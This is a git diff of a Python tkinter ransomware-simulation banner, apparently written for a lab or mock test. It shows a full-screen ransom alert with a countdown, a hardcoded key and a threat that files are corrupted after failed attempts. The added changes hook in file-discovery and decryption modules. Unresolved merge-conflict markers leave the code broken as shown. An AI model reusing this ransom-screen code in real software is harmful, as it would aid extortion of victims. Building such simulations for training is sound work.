@@ -2,7 +2,15 @@ import tkinter as tk
 from tkinter import messagebox
 import time
 import winsound
+<<<<<<< Updated upstream
 
+=======
+import Decryption
+import filediscovery
+
+#Stores all the discoved files to decrypt later
+discovered_files = filediscovery.scan_files()
+>>>>>>> Stashed changes
 
 class RansomwareBanner:
     def __init__(self, root):
@@ -10,7 +18,7 @@ class RansomwareBanner:
         self.root.title("SYSTEM ALERT")
         self.root.attributes("-fullscreen", True)
         self.root.configure(bg="darkred")
-        self.correct_key = "LAB"
+        self.correct_key = "key"
         self.failed_attempts = 0
         self.time_remaining = 610  # 10 minutes and 10 second countdown (simulation)
         # Title
@@ -121,10 +129,22 @@ class RansomwareBanner:
 
         #Ignore placeholder
         if pwd == "Enter Decryption Key":
+<<<<<<< Updated upstream
             return 
         
         if pwd == self.correct_key:
             messagebox.showinfo("Access Restored","Files successfully been decrypted ✅🔓")
+=======
+            return
+
+        if pwd == self.correct_key:
+            messagebox.showinfo(
+                "Access Restored", "Files successfully been decrypted ✅🔓"
+            )
+            for path in discovered_files:
+                Decryption.decrypt_folder(path['path'])
+            # makes sure that file is decrypted for mock_test
+>>>>>>> Stashed changes
             self.root.destroy()
         
         if pwd != self.correct_key:
@@ -132,9 +152,19 @@ class RansomwareBanner:
             messagebox.showerror("ERROR","Invalid decryption key provided.")
 
         if self.failed_attempts > 2:
+<<<<<<< Updated upstream
             messagebox.showerror("ERROR","After failing 3 attempts, Files have now been corrupted!☠️☠️☠️")
+=======
+            messagebox.showerror(
+                "ERROR", "After failing 3 attempts, Files have now been corrupted!☠️☠️☠️"
+            )
+            for path in discovered_files:
+                Decryption.decrypt_folder(path['path'])
+            # makes sure that file is decrypted for mock_test
+>>>>>>> Stashed changes
             self.root.destroy()
     def exit_simulation(self):
+<<<<<<< Updated upstream
         self.root.destroy()
 
 
@@ -142,3 +172,10 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = RansomwareBanner(root)
     root.mainloop()
+=======
+        for path in discovered_files:
+            Decryption.decrypt_folder(path['path'])
+         # makes sure that file is decrypted for mock_test
+        self.root.destroy()
+
+>>>>>>> Stashed changes
